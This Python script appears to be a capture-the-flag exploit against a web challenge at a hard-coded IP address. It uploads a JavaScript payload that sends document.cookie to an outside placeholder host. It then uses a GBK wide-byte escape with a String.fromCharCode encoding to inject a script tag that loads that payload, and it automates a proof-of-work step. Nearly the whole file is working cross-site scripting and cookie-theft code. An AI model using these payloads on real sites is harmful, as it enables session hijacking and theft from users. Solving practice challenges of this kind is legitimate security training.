#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2020/03/07, 21:43
"""


# String.fromCharCode
#
import requests as req
import re
import commands

cookies = {
    'PHPSESSID': 'a68ff240535c536f9bcc324a1a32c676'
}


def upload(data):
    files = {'file': ('x', data, 'application/octet-stream')}
    resp = req.post('http://159.138.4.209:1002/customlize.php?referer=index',
                    files=files, cookies=cookies)


def quiz(answer="user->url->pre"):
    params = {
        'answer': answer,
        "referer": "Content-Type:text/html;charset=GBK;Referer:index"
    }
    resp = req.get(
        'http://159.138.4.209:1002/quiz.php', params=params, cookies=cookies)
    print(resp.headers['Content-Type'])


def run_code(code):
    res = commands.getstatusoutput(
        "/usr/local/src/go/bin/hashpow -t md5 -c %s" % (code))
    # print(res)
    if len(res) > 1 and res[0] == 0:
        return res[1]
    return False


def ask():
    resp = req.get(
        'http://159.138.4.209:1002/ask.php?referer=index', cookies=cookies, allow_redirects=False)
    if resp.status_code == 200:
        # print(resp.text)
        m = re.findall(r'== ([a-f0-9]{6})', resp.text)
        if m:
            c = run_code(str(m[0]))
            if c:
                params = {
                    "rand": c
                }
                resp = req.get('http://159.138.4.209:1002/ask.php',
                               params=params, cookies=cookies)
                print(resp.url)


def genPl(fn):
    fn = "<script src=/upload/%s></script>" % fn
    return "\xdf';document.write(String.fromCharCode(%s));//" % (
        ','.join([str(ord(i)) for i in fn]))


def message():
    # 头像
    pl = genPl('9dd4e461268c8034f5c8564e155c67a6x')
    params = {
        "message": pl
    }
    print(pl)
    resp = req.get('http://159.138.4.209:1002/',
                   params=params, cookies=cookies)


if __name__ == '__main__':
    upload('location.href="//xxxxx?c="+escape(document.cookie)')
    message()
    quiz()
    ask()
